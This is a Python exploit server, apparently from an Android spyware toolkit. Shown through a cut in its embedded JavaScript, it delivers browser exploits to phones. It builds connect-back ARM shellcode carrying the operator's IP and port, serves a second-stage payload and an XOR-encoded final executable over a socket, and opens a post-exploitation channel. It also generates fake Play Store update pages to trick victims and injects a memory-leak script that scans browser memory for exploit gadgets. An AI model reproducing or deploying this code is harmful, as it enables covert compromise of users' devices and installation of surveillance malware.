#!/usr/bin/env python

import re
import os
import sys
import cgi
import math
import time
import zlib
import types
import base64
import string
import random
import struct
import socket
import logging
import httplib
import urlparse
import threading
import BaseHTTPServer
from exp_server import *

logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.DEBUG)

LOG = dict()


"""
TEA
"""

def raw_xxtea(v, n, k):
    assert type(v) == type([])
    assert type(k) == type([]) or type(k) == type(())
    assert type(n) == type(1)

    def MX():
        return ((z>>5)^(y<<2)) + ((y>>3)^(z<<4))^(sum^y) + (k[(p & 3)^e]^z)

    def u32(x):
        return x & 0xffffffff

    y = v[0]
    sum = 0
    DELTA = 0x9e3779b9

    if n > 1:       # Encoding
        z = v[n-1]
        q = 6 + 52 / n
        while q > 0:
            q -= 1
            sum = u32(sum + DELTA)
            e = u32(sum >> 2) & 3
            p = 0
            while p < n - 1:
                y = v[p+1]
                z = v[p] = u32(v[p] + MX())
                p += 1
            y = v[0]
            z = v[n-1] = u32(v[n-1] + MX())
        return 0
    elif n < -1:    # Decoding
        n = -n
        q = 6 + 52 / n
        sum = u32(q * DELTA)
        while sum != 0:
            e = u32(sum >> 2) & 3
            p = n - 1
            while p > 0:
                z = v[p-1]
                y = v[p] = u32(v[p] - MX())
                p -= 1
            z = v[n-1]
            y = v[0] = u32(v[0] - MX())
            sum = u32(sum - DELTA)
        return 0
    return 1


class XXTEAException(Exception):
    pass


class XXTEA:
    """
    XXTEA wrapper class, easy to use and compatible (by duck typing) with the
    Blowfish class.
    """

    def __init__(self, key):
        """
        Initializes the inner class data with the given key. The key must be
        128-bit (16 characters) in length.
        """
        if len(key) != 16 or type(key) != type(""):
            raise XXTEAException("Invalid key")
        self.key = struct.unpack("IIII", key)
        assert len(self.key) == 4
        self.initCTR()

    def encrypt(self, data):
        """
        Encrypts a block of data (of size a multiple of 4 bytes, minimum 8
        bytes) and returns the encrypted data.
        """
        if len(data) % 4 != 0:
            raise XXTEAException("Invalid data - size must be a multiple of 4 bytes")
        ldata = len(data) / 4
        idata = list(struct.unpack("%dI" % ldata, data))
        if raw_xxtea(idata, ldata, self.key) != 0:
            raise XXTEAException("Cannot encrypt")
        return struct.pack("%dI" % ldata, *idata)

    def decrypt(self, data):
        """
        Decrypts a block of data encrypted with encrypt() and returns the
        decrypted data.
        """
        if len(data) % 4 != 0:
            raise XXTEAException("Invalid data - size must be a multiple of 4 bytes")
        ldata = len(data) / 4
        idata = list(struct.unpack("%dI" % ldata, data))
        if raw_xxtea(idata, -ldata, self.key) != 0:
            raise XXTEAException("Cannot encrypt")
        return struct.pack("%dI" % ldata, *idata)

    def initCTR(self, iv=0):
        """
        Initializes CTR mode with optional 32-bit IV.
        """
        self.ctr_iv = [0, iv]
        self._calcCTRBUF()

    def _calcCTRBUF(self):
        """
        Calculates one (64-bit) block of CTR keystream.
        """
        self.ctr_cks = self.encrypt(struct.pack("II", *self.ctr_iv)) # keystream block
        self.ctr_iv[1] += 1
        if self.ctr_iv[1] > 0xffffffff:
            self.ctr_iv[0] += 1
            self.ctr_iv[1] = 0
        self.ctr_pos = 0

    def _nextCTRByte(self):
        """Returns one byte of CTR keystream"""
        b = ord(self.ctr_cks[self.ctr_pos])
        self.ctr_pos += 1
        if self.ctr_pos >= len(self.ctr_cks):
            self._calcCTRBUF()
        return b

    def encryptCTR(self, data):
        """
        Encrypts a buffer of data with CTR mode. Multiple successive buffers
        (belonging to the same logical stream of buffers) can be encrypted
        with this method one after the other without any intermediate work.
        """
        if type(data) != types.StringType:
            raise RuntimeException, "Can only work on 8-bit strings"
        result = []
        for ch in data:
            result.append(chr(ord(ch) ^ self._nextCTRByte()))
        return "".join(result)

    def decryptCTR(self, data):
        return self.encryptCTR(data)

    def block_size(self):
        return 8

    def key_length(self):
        return 16

    def key_bits(self):
        return self.key_length()*8

# end of tea


class Exploit:

    def __init__(self, ip, socket_port, final_executable,  exploit_id, landing_page, redirect_page):
        
        # format  \ua8c0\u8345 - (b)168 (a)192  (d)131 (c)69
        ip = map(lambda x: hex(int(x))[2:], ip.split('.'))

        assert len(ip) == 4
        
        i=0
        while( i < 4):
            if len(ip[i]) == 1:
                ip[i] = '0' + ip[i]
            i+=1
        

        self.ip = '\u' + ip[1] + ip[0] + '\u' + ip[3] + ip[2]


        # port is port for shellcode transfer
        self.socket_port_normalized = int(socket_port)
        self.socket_port = fmt_short(int(socket_port)) 
        
        # server_port is http port
        self.server_port = 80

        #self.file_size =  file_size

        # local exploitation report
        self.local_report = ''

        # Updated by local exploit
        self.fakevendor = "Super Vendor" 

        # format \u4567\u0123
        # key must be in hex
        
        while True:
            xor_key = ''.join([ random.choice(string.digits) for i in range(0,8)])
            
            if not '00' in xor_key:
                break
               

        # got a weird behaviours on slow vps - mistery
        xor_key = '11111111'

        assert len(xor_key) == 8, 'Key must be 4 bytes e.g. 01234567'
        self.xor_key_normalized = xor_key
        self.xor_key = '\u' + xor_key[4:8] + '\u' + xor_key[0:4]
        
        
        self.third_stage = self.generate_third_stage()
       
        self.final_executable, size = xor( '{}/{}'.format(exploit_id,final_executable), self.xor_key_normalized)

        
        self.exploit_id    = exploit_id
        LOG['exploit_id']  = exploit_id

        self.landing_page_path  = landing_page
        self.redirect_page_path = redirect_page

        
        self.report_generated = False
        self.report_lock = threading.Lock()

        self.run_id = ''.join( [random.choice(string.ascii_lowercase + string.digits) for i in range(0, 8)])

            

        # tea key 16 characters
        self.tea_key = ''
        while( len(self.tea_key) < 16 ):
            self.tea_key += random.choice(string.ascii_lowercase + string.digits)

        self.tea = XXTEA(self.tea_key)
        
        LOG['tea_key'] = self.tea_key

        
        self.leak_page                    = self.generate_leak_stage() 
        self.redirect_page                = self.generate_redirect_page() 
        self.exploitless_landing_page     = self.generate_exploitless_landing_page()
        
        self.update_html_served           = False




    def socket_server(self):

        self.socket_server_lock.acquire()

        print 'Spawning socket server on port {}'.format(self.socket_port_normalized)

        # handle KeyboardInterrupt 'gracefully' within launch()
        #if self.bailing:
        #    return
        
        third_stage = map(lambda x: struct.pack('>B', x), self.third_stage)
        third_stage = ''.join(third_stage)
        conn = None
        conn2 = None

        try:
            # spawn a socket, wait for shellcode to connect back and send 3rd stage
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind( ('', int(self.socket_port_normalized)) ) 
  
            self.socket.listen(0)

            logging.debug('Listen for 3rd stage {}'.format(time.ctime()))
            LOG['shellcode_listen_time'] = time.ctime()


            self.socket.settimeout(120)            
            conn, addr = self.socket.accept()
            logging.debug('Got a 3rd stage connection from {}'.format(addr) )
            LOG['shellcode_client'] = addr


            conn.sendall(third_stage)
            LOG['shellcode_sent_time'] = time.ctime()
            logging.debug('3rd stage sent {}'.format(time.ctime()))
        

            logging.debug('Listen for final executable')
            conn2, addr2 = self.socket.accept()
            logging.debug('Got a final executable connection from {}'.format( addr2 ) )
            LOG['shared_object_client'] = addr2

            
            # both che socket connections must come from the same ip
            if addr[0] != addr2[0]:
                LOG['socket_connection_mismatch'] = '{} vs {}'.format(addr[0], addr2[0])
                raise Exception('Ip address mismatch')

                                                  

            conn2.sendall(self.final_executable)
            LOG['shared_object_sent_time'] = time.ctime()
            logging.debug('Final payload sent')

            conn.close()
            conn2.close()
 
            logging.info('Waiting at post exploitation accept')
            conn3, addr3 = self.socket.accept()


            if( addr[0] != addr3[0] ):
                raise Exception('Post exploitation: Ip address Mismatch')


            start_exp_server(conn3)


        except socket.timeout as e:
            LOG['exploit_fail_reason'] = 'Timeout'
            logging.info('Timeout ') 

        except Exception as e:
            logging.info('Bailing socket server')

        except socket.error as e:
            logging.info('Socket error {}'.format(e))


        self.socket.close()
        logging.info('Socket server closed')
        
        self.report()



    # moved to main
    def launch(self):
        
        self.socket_server_thread = threading.Thread(target=self.socket_server)
        self.socket_server_lock = threading.Lock()
        self.socket_server_lock.acquire() 
        self.socket_server_thread.start()

        try:
            logging.info('Starting HTTP server on port {}'.format(self.server_port))
            self.bailing = False            
            self.http_server.serve_forever()
            
        except KeyboardInterrupt:
            self.bail()

        self.report()


    def bail(self):
        logging.info('Bailing HTTP server')
        self.http_server.shutdown()
        self.bailing = True

        try:
            self.socket_server_lock.release()
            self.socket.shutdown(socket.SHUT_RDWR)
            self.socket.close()
        except Exception:
            logging.debug('Release socket server lock')
            pass

        logging.info('HTTP server closed')        



    def report(self):

        self.report_lock.acquire()

       
        if not self.report_generated:

            log_file = open('run_{}.log'.format(self.run_id), 'w')
            log_file.write('Report {}\n'.format(self.run_id))
                    
            logging.debug('----> Report {}<----'.format(self.run_id))

            for l in LOG.keys():
                logging.debug( '{} -> {}'.format(l, LOG[l]) )
                log_file.write( '{} -> {}\n'.format(l, LOG[l]) )

            self.parse_local_report(log_file)

            log_file.close()


        
        self.report_lock.release()


    # Generate a report concerning local exploitation
    def parse_local_report(self, log_fd):
        msg = {
            'dwer':'An error occured during download!',
            'pker':'An error occured analyzing packages on device!',
            'expfl':'Exploitation failed!',
            'expok':'Exploitation correctly completed',
            'lvdw':'Downloading Levitator',
            'exdw':'Downloading Exynos',
            'gbdw':'Downloading Gingerbreak',
            'gmdw':'Downloading Gimli',
            'em':'Emulator detected!',
            'stsoc':'Going in social mode!'
            }


        if self.local_report == "":
            log_fd.write("\nNo local report generated\n\n")
        else:
            log_fd.write("\n" + "LOCAL REPORT:")
            for i in self.local_report.strip().split("!"):
                if msg.get(i) != None:
                    log_fd.write("\n" + msg.get(i))
                else:
                    log_fd.write("\n" + i)            
            log_fd.write("\n\n")



    def generate_third_stage(self):
        
        third_stage_code = [ 0x99, 0xb0, 0x02, 0xb4, 0x6b, 0xa0, 0x0c, 0x27,
                             0x01, 0xdf, 0x6a, 0xa2, 0x92, 0x46, 0x1f, 0x32,
                             0x93, 0x46, 0x00, 0x28, 0x12, 0xd0, 0x6f, 0xa0,
                             0x0c, 0x27, 0x01, 0xdf, 0x6d, 0xa2, 0x92, 0x46,
                             0x1f, 0x32, 0x93, 0x46, 0x00, 0x28, 0x09, 0xd0,
                             0x72, 0xa0, 0x0c, 0x27, 0x01, 0xdf, 0x71, 0xa2,
                             0x92, 0x46, 0x10, 0x32, 0x93, 0x46, 0x00, 0x28,
                             0x0d, 0xd0, 0x50, 0xd1, 0x02, 0x27, 0x01, 0xdf,
                             0x00, 0x28, 0x08, 0xd1, 0x76, 0xa0, 0x70, 0xa2,
                             0x79, 0xa1, 0xdb, 0x1a, 0x0f, 0xb4, 0x92, 0x1a,
                             0x69, 0x46, 0x0b, 0x27, 0x01, 0xdf, 0x02, 0x20,
                             0x01, 0x21, 0x92, 0x1a, 0x0f, 0x02, 0x19, 0x37,
                             0x01, 0xdf, 0x06, 0x1c, 0x49, 0xa1, 0x10, 0x22,
                             0x02, 0x37, 0x01, 0xdf, 0x4b, 0xa2, 0x12, 0x88,
                             0x4b, 0xa1, 0x09, 0x88, 0x4c, 0xa0, 0x05, 0x27,
                             0x01, 0xdf, 0x80, 0x46, 0xb1, 0x46, 0x00, 0x26,
                             0x6d, 0xa2, 0x12, 0x88, 0x73, 0xa5, 0x29, 0x1c,
                             0x48, 0x46, 0x03, 0x27, 0x01, 0xdf, 0x01, 0x28,
                             0x12, 0xdb, 0x84, 0x46, 0x67, 0xa1, 0x09, 0x68,
                             0x2a, 0x1c, 0x00, 0x23, 0x10, 0x68, 0x48, 0x40,
                             0x10, 0x60, 0x04, 0x33, 0x04, 0x32, 0x63, 0x45,
                             0xf8, 0xdb, 0x62, 0x46, 0x29, 0x1c, 0x40, 0x46,
                             0x04, 0x27, 0x01, 0xdf, 0x36, 0x18, 0xe3, 0xe7,
                             0x40, 0x46, 0x06, 0x27, 0x01, 0xdf, 0x48, 0x46,
                             0x06, 0x27, 0x01, 0xdf, 0x38, 0xa1, 0x5a, 0x46,
                             0x08, 0x68, 0x10, 0x60, 0x04, 0x31, 0x04, 0x32,
                             0x08, 0x68, 0x10, 0x60, 0x04, 0x31, 0x04, 0x32,
                             0x08, 0x78, 0x10, 0x70, 0x01, 0xe0, 0x01, 0x27,
                             0x01, 0xdf, 0x02, 0xbc, 0x0e, 0x1c, 0x8c, 0x31,
                             0x0a, 0x68, 0x94, 0x46, 0x20, 0x31, 0x0a, 0x68,
                             0x90, 0x46, 0x04, 0x31, 0x0a, 0x68, 0x91, 0x46,
                             0x18, 0x31, 0x0a, 0x68, 0x93, 0x46, 0x53, 0xa0,
                             0x00, 0xf0, 0x1a, 0xf8, 0x60, 0x44, 0x01, 0xb4,
                             0x4e, 0xa0, 0x00, 0xf0, 0x15, 0xf8, 0x60, 0x44,
                             0x01, 0xb4, 0x50, 0x46, 0x01, 0x21, 0x08, 0xbc,
                             0x1b, 0x68, 0x98, 0x47, 0x47, 0xa1, 0x08, 0xbc,
                             0x1b, 0x68, 0x98, 0x47, 0x04, 0x1c, 0x1b, 0xa0,
                             0x00, 0x68, 0x1b, 0xa1, 0x09, 0x88, 0x00, 0x2c,
                             0xd5, 0xd0, 0xa0, 0x47, 0xd3, 0xe7, 0xc0, 0x46,
                             0x04, 0x1c, 0x48, 0x46, 0xff, 0x27, 0x3f, 0x01,
                             0x00, 0x25, 0x01, 0x35, 0xbd, 0x42, 0x1e, 0xda,
                             0x10, 0x30, 0x01, 0x68, 0x41, 0x44, 0x0b, 0x68,
                             0x22, 0x68, 0x9a, 0x42, 0xf5, 0xd1, 0x04, 0x31,
                             0x04, 0x34, 0x0b, 0x88, 0x22, 0x88, 0x9a, 0x42,
                             0xef, 0xd1, 0x2f, 0x02, 0x58, 0x46, 0x04, 0x38,
                             0x34, 0x1c, 0xcc, 0x34, 0x24, 0x68, 0x01, 0x3c,
                             0x00, 0x2c, 0x08, 0xdd, 0x08, 0x30, 0x01, 0x68,
                             0x09, 0x0a, 0x09, 0x02, 0xb9, 0x42, 0xf6, 0xd1,
                             0x04, 0x38, 0x00, 0x68, 0x70, 0x47, 0x00, 0x20,
                             0x70, 0x47, 0xc0, 0x46 ]

        third_stage_sockaddr = [ 0x02, 0x00, 
                                 #0x12, 0x34,
                                 int(self.socket_port[4:6],16), int(self.socket_port[2:4],16),
                                 #0xc0, 0xa8, 0x45, 0x83,
                                 int(self.ip[4:6],16), int(self.ip[2:4],16), int(self.ip[10:12],16), int(self.ip[8:10],16) ]

        
        third_stage_ip = [ int(self.ip[10:12],16), int(self.ip[8:10],16), int(self.ip[4:6],16), int(self.ip[2:4],16)  ]

        third_stage_port = [ int(self.socket_port[2:4],16), int(self.socket_port[4:6],16), 0x1, 0x1 ]

        third_stage_open_flags = [ 0xc0, 0x01, 0x01, 0x01, 0x42, 0x02, 0x01, 0x01 ]
        
        third_stage_dropped_file_size = [  0x2d, 0x00, 0x00, 0x00 ]

        third_stage_dropped_file_name = [ ord(random.choice(string.ascii_lowercase + string.digits)),
                                          ord(random.choice(string.ascii_lowercase + string.digits)), 
                                          ord(random.choice(string.ascii_lowercase + string.digits)), 
                                          ord(random.choice(string.ascii_lowercase + string.digits)), 
                                          ord(random.choice(string.ascii_lowercase + string.digits)), 
                                          0x2e, 0x73, 0x6f,         # .so
                                          0x00, 0x01, 0x01, 0x01 ]  # padding


        third_stage_strings = [ 0x2f, 0x61, 0x70, 0x70, 0x2d, 0x63, 0x61, 0x63,
                                0x68, 0x65, 0x2f, 0x63, 0x6f, 0x6d, 0x2e, 0x61,
                                0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2e, 0x62,
                                0x72, 0x6f, 0x77, 0x73, 0x65, 0x72, 0x2f, 0x00,
                                0x2f, 0x64, 0x61, 0x74, 0x61, 0x2f, 0x64, 0x61,
                                0x74, 0x61, 0x2f, 0x63, 0x6f, 0x6d, 0x2e, 0x61,
                                0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2e, 0x62,
                                0x72, 0x6f, 0x77, 0x73, 0x65, 0x72, 0x2f, 0x00,
                                0x2f, 0x64, 0x61, 0x74, 0x61, 0x2f, 0x6c, 0x6f,
                                0x63, 0x61, 0x6c, 0x2f, 0x74, 0x6d, 0x70, 0x2f,
                                0x00, 0x01, 0x01, 0x01, 0x2e, 0x2f, 0x63, 0x61,
                                0x63, 0x68, 0x65, 0x2f, 0x77, 0x65, 0x62, 0x76,
                                0x69, 0x65, 0x77, 0x43, 0x61, 0x63, 0x68, 0x65,
                                0x00, 0x01, 0x01, 0x01, 0x2f, 0x73, 0x79, 0x73,
                                0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
                                0x72, 0x6d, 0x00, 0x01, 0x2d, 0x52, 0x00, 0x01 ]



        key = self.xor_key.replace('\u','')

        third_stage_key = [ int(key[2:4],16), int(key[0:2],16), int(key[6:8],16), int(key[4:6],16) ]

        third_stage_buffer_size = [ 0x00, 0x04, 0x01, 0x01 ]

        third_stage_export = [ 0x73, 0x74, 0x61, 0x72, 0x74, 0x00, 0x01, 0x01 ]

        third_stage_dlstrings = [  0x64, 0x6c, 0x6f, 0x70, 0x65, 0x6e, 0x00, 0x01,
                                   0x64, 0x6c, 0x73, 0x79, 0x6d, 0x00, 0x01, 0x01  ]




        third_stage =   third_stage_code + third_stage_sockaddr + third_stage_ip + \
            third_stage_port + third_stage_open_flags + third_stage_dropped_file_size +\
            third_stage_dropped_file_name + third_stage_strings +third_stage_key + \
            third_stage_buffer_size + third_stage_export + third_stage_dlstrings
    
        
        # xor_key is key as 01234567
        third_stage = xor_buffer(third_stage, self.xor_key_normalized)

        return third_stage


    # START FAKE PLAY STORE PAGES

    """
    Page containing the link the user has to click
    to prompt 'unknown sources'
    """
    def generate_update_page(self):

        page = open('play/main.html', 'r').read()

        faketitle = 'Android perfomance package'
        page = page.replace('FAKETITLE', faketitle)
        page = page.replace('FAKEVENDOR', self.fakevendor)

        return page


    # END FAKE PLAY STORE PAGES

    @staticmethod
    def generate_fetch_update_page():
        key = 'b323848a7a9a16001b28fc3747a88c59'
        #key = '$123456*' # TODO: remove

        page = '''
        
        <html>
	  <head>
            <script>
	      function completed() {
	        document.location = "https://play.google.com/store";
	      }
   	    </script>
	  </head>
	  <body onload=completed()>
	    '''
        page += '{}</body></html>'.format(key)


        return page
        

    # aka: redirect_page without redirect
    def generate_exploitless_landing_page(self):
        
        return open('{}/{}'.format(self.exploit_id, self.redirect_page_path)).read()

# old generate_exploitless_landing_page
#         page = '''
       
#         <html>
#         <head>
#         </head>
#         <body>
# '''
     
#         page += open('{}/{}'.format(self.exploit_id, self.redirect_page_path)).read()


#         page += '''</body>
#        </html>

# '''
#         return page


    def generate_redirect_page(self):

        # read the whole page
        page = open('{}/{}'.format(self.exploit_id, self.redirect_page_path)).read()
        
        # insert redirect function at the end of </head>
        script = '''
<script>
  function redir() {
    document.location = 'first.html'
  }
</script> 
</head>
        '''
        
        page = page.replace('</head>', script)

        # insert body onload
        onload = '<body onload=redir()'
        page = page.replace('<body', onload)
        
        #open("redirect.html", 'w').write(page)

        return page


# old generate_redirect_page
#         page = '''
#         <html>
#         <head>
#           <script>
#              function redir() {
#                document.location = 'first.html'
#              }
#           </script> 
#         </head>
#         <body onload=redir()>
# '''
     
#         page += open('{}/{}'.format(self.exploit_id, self.redirect_page_path)).read()


#         page += '''</body>
#        </html>

# '''
#         return page



    def generate_css(self):
        """
        Code served within <style>
        """

        page = '''



        '''

        return page


    def generate_fake_content(self):
        """
        Code served within <body>
        """
        page = open('{}/{}'.format(self.exploit_id, self.landing_page_path)).read()

        

        return page


    def generate_tea(self):
        return '<script>{}</script>'.format(open('tea_compressed.js', 'r').read())


    def generate_leak_stage(self):
        
   
        # 1] put tea js lib at the bottom of </head>
 
        tea =  self.generate_tea()
        tea += '''
</head>'''

        page = open('{}/{}'.format(self.exploit_id, self.landing_page_path)).read()

        page = page.replace('</head>', tea)
        
        # 2] put tea key in body id
        tea_key = '<body id="{}"'.format(self.tea_key)
        
        page = page.replace('<body', tea_key)


        # 3] put leak payload at the bottom of the page
        page = page.replace('</body>', '')
        page = page.replace('</html>', '')

        page += '''


<div id="ad2">.</div>
<div id="ad1"></div>

<script>


var Struct=new function(){var c,b=false,a=this;a._DeArray=function(e,f,d){return[e.slice(f,f+d)]};a._EnArray=function(e,h,d,f){for(var g=0;g<d;e[h+g]=f[g]?f[g]:0,g++){}};a._DeChar=function(d,e){return String.fromCharCode(d[e])};a._EnChar=function(d,f,e){d[f]=e.charCodeAt(0)};a._DeInt=function(d,k){var j=b?(c.len-1):0,m=b?-1:1,g=j+m*c.len,l,e,h;for(l=0,e=j,h=1;e!=g;l+=(d[k+e]*h),e+=m,h*=256){}if(c.bSigned&&(l&Math.pow(2,c.len*8-1))){l-=Math.pow(2,c.len*8)}return l};a._EnInt=function(d,j,e){var h=b?(c.len-1):0,k=b?-1:1,g=h+k*c.len,f;e=(e<c.min)?c.min:(e>c.max)?c.max:e;for(f=h;f!=g;d[j+f]=e&255,f+=k,e>>=8){}};a._DeString=function(e,g,d){for(var h=new Array(d),f=0;f<d;h[f]=String.fromCharCode(e[g+f]),f++){}return h.join("")};a._EnString=function(e,j,d,f){for(var h,g=0;g<d;e[j+g]=(h=f.charCodeAt(g))?h:0,g++){}};a._De754=function(t,g){var u,o,k,n,q,r,h,j,f,l;h=c.mLen,j=c.len*8-c.mLen-1,l=(1<<j)-1,f=l>>1;n=b?0:(c.len-1);q=b?1:-1;u=t[g+n];n+=q;r=-7;for(o=u&((1<<(-r))-1),u>>=(-r),r+=j;r>0;o=o*256+t[g+n],n+=q,r-=8){}for(k=o&((1<<(-r))-1),o>>=(-r),r+=h;r>0;k=k*256+t[g+n],n+=q,r-=8){}switch(o){case 0:o=1-f;break;case l:return k?NaN:((u?-1:1)*Infinity);default:k=k+Math.pow(2,h);o=o-f;break}return(u?-1:1)*k*Math.pow(2,o-h)};a._En754=function(t,g,u){var w,o,k,n,q,r,h,j,f,l;h=c.mLen,j=c.len*8-c.mLen-1,l=(1<<j)-1,f=l>>1;w=u<0?1:0;u=Math.abs(u);if(isNaN(u)||(u==Infinity)){k=isNaN(u)?1:0;o=l}else{o=Math.floor(Math.log(u)/Math.LN2);if(u*(r=Math.pow(2,-o))<1){o--;r*=2}if(o+f>=1){u+=c.rt/r}else{u+=c.rt*Math.pow(2,1-f)}if(u*r>=2){o++;r/=2}if(o+f>=l){k=0;o=l}else{if(o+f>=1){k=(u*r-1)*Math.pow(2,h);o=o+f}else{k=u*Math.pow(2,f-1)*Math.pow(2,h);o=0}}}for(n=b?(c.len-1):0,q=b?-1:1;h>=8;t[g+n]=k&255,n+=q,k/=256,h-=8){}for(o=(o<<h)|k,j+=h;j>0;t[g+n]=o&255,n+=q,o/=256,j-=8){}t[g+n-q]|=w*128};a._sPattern="(\\d+)?([AxcbBhHsfdiIlL])";a._lenLut={A:1,x:1,c:1,b:1,B:1,h:2,H:2,s:1,f:4,d:8,i:4,I:4,l:4,L:4};a._elLut={A:{en:a._EnArray,de:a._DeArray},s:{en:a._EnString,de:a._DeString},c:{en:a._EnChar,de:a._DeChar},b:{en:a._EnInt,de:a._DeInt,len:1,bSigned:true,min:-Math.pow(2,7),max:Math.pow(2,7)-1},B:{en:a._EnInt,de:a._DeInt,len:1,bSigned:false,min:0,max:Math.pow(2,8)-1},h:{en:a._EnInt,de:a._DeInt,len:2,bSigned:true,min:-Math.pow(2,15),max:Math.pow(2,15)-1},H:{en:a._EnInt,de:a._DeInt,len:2,bSigned:false,min:0,max:Math.pow(2,16)-1},i:{en:a._EnInt,de:a._DeInt,len:4,bSigned:true,min:-Math.pow(2,31),max:Math.pow(2,31)-1},I:{en:a._EnInt,de:a._DeInt,len:4,bSigned:false,min:0,max:Math.pow(2,32)-1},l:{en:a._EnInt,de:a._DeInt,len:4,bSigned:true,min:-Math.pow(2,31),max:Math.pow(2,31)-1},L:{en:a._EnInt,de:a._DeInt,len:4,bSigned:false,min:0,max:Math.pow(2,32)-1},f:{en:a._En754,de:a._De754,len:4,mLen:23,rt:Math.pow(2,-24)-Math.pow(2,-77)},d:{en:a._En754,de:a._De754,len:8,mLen:52,rt:0}};a._UnpackSeries=function(k,f,d,h){for(var g=c.de,j=[],e=0;e<k;j.push(g(d,h+e*f)),e++){}return j};a._PackSeries=function(l,g,d,j,e,f){for(var h=c.en,k=0;k<l;h(d,j+k*g,e[f+k]),k++){}};a.Unpack=function(f,e,i){b=(f.charAt(0)!="<");i=i?i:0;var h=new RegExp(this._sPattern,"g"),d,k,g,j=[];while(d=h.exec(f)){k=((d[1]==undefined)||(d[1]==""))?1:parseInt(d[1]);g=this._lenLut[d[2]];if((i+k*g)>e.length){return undefined}switch(d[2]){case"A":case"s":j.push(this._elLut[d[2]].de(e,i,k));break;case"c":case"b":case"B":case"h":case"H":case"i":case"I":case"l":case"L":case"f":case"d":c=this._elLut[d[2]];j.push(this._UnpackSeries(k,g,e,i));break}i+=k*g}return Array.prototype.concat.apply([],j)};a.PackTo=function(f,l,d,o){b=(f.charAt(0)!="<");var q=new RegExp(this._sPattern,"g"),g,e,r,k=0,h;while(g=q.exec(f)){e=((g[1]==undefined)||(g[1]==""))?1:parseInt(g[1]);r=this._lenLut[g[2]];if((d+e*r)>l.length){return false}switch(g[2]){case"A":case"s":if((k+1)>o.length){return false}this._elLut[g[2]].en(l,d,e,o[k]);k+=1;break;case"c":case"b":case"B":case"h":case"H":case"i":case"I":case"l":case"L":case"f":case"d":c=this._elLut[g[2]];if((k+e)>o.length){return false}this._PackSeries(e,r,l,d,o,k);k+=e;break;case"x":for(h=0;h<e;h++){l[d+h]=0}break}d+=e*r}return l};a.Pack=function(d,e){return this.PackTo(d,new Array(this.CalcLength(d)),0,e)};a.CalcLength=function(e){var g=new RegExp(this._sPattern,"g"),d,f=0;while(d=g.exec(e)){f+=(((d[1]==undefined)||(d[1]==""))?1:parseInt(d[1]))*this._lenLut[d[2]]}return f}}();Number.prototype.toFullFixed=function(){var g=Math.abs(this).toExponential();var b=g.split("e");var h=b[0].replace(".","");var l=h.length;var j=parseInt(b[1],10);var m=Math.abs(j);if(j>=0){m=m-l+1}var k="";for(var c=0;c<m;++c){k+="0"}if(j<=0){h=k+h;h=h.substring(0,1)+"."+h.substring(1)}else{h=h+k;if(m<0){h=h.substring(0,j+1)+"."+h.substring(j+1)}}if(this<0){h="-"+h}return h};function m_d(d,c){var b="";var e=false;var f=false;var g=false;e=Struct.Pack(">II ",[c,d]);f=Struct.Unpack(">d",e);b=new Number(f).toFullFixed();return b}function engine(){if(window.devicePixelRatio){if(escape(navigator.javaEnabled.toString())==="function%20javaEnabled%28%29%20%7B%20%5Bnative%20code%5D%20%7D"){return 1}else{return 0}}}function os(){var a=navigator.userAgent.match(/Android ((\d\.?)+)/);if(a){if(a.length<2){a=null}else{a=a[1].split(".").map(function(b){return +b})}}return a}function mr(g,h){var f=0;var k=g;var l=0;var d=document.createElement("h1");var c="";var b=h;while(l<h){var e=false;var j=false;var a=false;e=m_d(k,b);d.style.src="local("+e+")";data=d.style.src;a=data.substr(0,data.length-1).substr(6);c+=a;k+=b;l+=b}return c}function m_s(g,j,b,d){var f=0;var l=g;var m=0;var h=document.createElement("h1");var c="";while(m<j){var e=false;var k=false;var a=false;e=m_d(l,b);h.style.src="local("+e+")";data=h.style.src;data=data.substr(0,data.length-1).substr(6);for(f=0;f<data.length;f++){if(d==1){if(data.charCodeAt(f).toString(16)=="696c"&&data.charCodeAt(f+1).toString(16)=="6462"&&data.charCodeAt(f+2).toString(16)=="2e6c"){return(l+f*2).toString(16)}}else{if(d==2){if(data.charCodeAt(f).toString(16)=="682f"&&data.charCodeAt(f+1).toString(16)=="6838"&&data.charCodeAt(f+2).toString(16)=="6a83"&&data.charCodeAt(f+3).toString(16)=="4638"&&data.charCodeAt(f+4).toString(16)=="4798"){return(l+f*2).toString(16)}}else{if(d==3){if(data.charCodeAt(f).toString(16)=="f107"&&data.charCodeAt(f+1).toString(16)=="70c"&&data.charCodeAt(f+2).toString(16)=="46bd"&&data.charCodeAt(f+3).toString(16)=="e8bd"&&data.charCodeAt(f+4).toString(16)=="40b0"&&data.charCodeAt(f+5).toString(16)=="b003"&&data.charCodeAt(f+6).toString(16)=="4770"){return(l+f*2).toString(16)}}else{if(d==4){if(data.charCodeAt(f).toString(16)=="6821"&&data.charCodeAt(f+1).toString(16)=="4620"&&data.charCodeAt(f+2).toString(16)=="6e8b"&&data.charCodeAt(f+3).toString(16)=="4629"&&data.charCodeAt(f+4).toString(16)=="4798"&&data.charCodeAt(f+5).toString(16)=="6820"&&data.charCodeAt(f+6).toString(16)=="a907"&&data.charCodeAt(f+7).toString(16)=="69c2"&&data.charCodeAt(f+8).toString(16)=="4620"&&data.charCodeAt(f+9).toString(16)=="4790"){return(l+f*2).toString(16)}}else{if(d==5){if(data.charCodeAt(f).toString(16)=="90"&&data.charCodeAt(f+1).toString(16)=="e92d"&&data.charCodeAt(f+2).toString(16)=="707d"&&data.charCodeAt(f+3).toString(16)=="e3a0"&&data.charCodeAt(f+4).toString(16)=="0"&&data.charCodeAt(f+5).toString(16)=="ef00"){return(l+f*2).toString(16)}}else{if(d==6){if(data.charCodeAt(f).toString(16)=="bd70"){return(l+f*2).toString(16)}}else{if(d==7){if(data.charCodeAt(f).toString(16)=="6807"&&data.charCodeAt(f+1).toString(16)=="68fd"&&data.charCodeAt(f+2).toString(16)=="47a8"){return(l+f*2).toString(16)}}else{if(d==8){if(data.charCodeAt(f).toString(16)=="46bd"&&data.charCodeAt(f+1).toString(16)=="b003"&&data.charCodeAt(f+2).toString(16)=="bcb0"&&data.charCodeAt(f+3).toString(16)=="bc08"&&data.charCodeAt(f+4).toString(16)=="b003"&&data.charCodeAt(f+5).toString(16)=="4718"){return(l+f*2).toString(16)}}else{i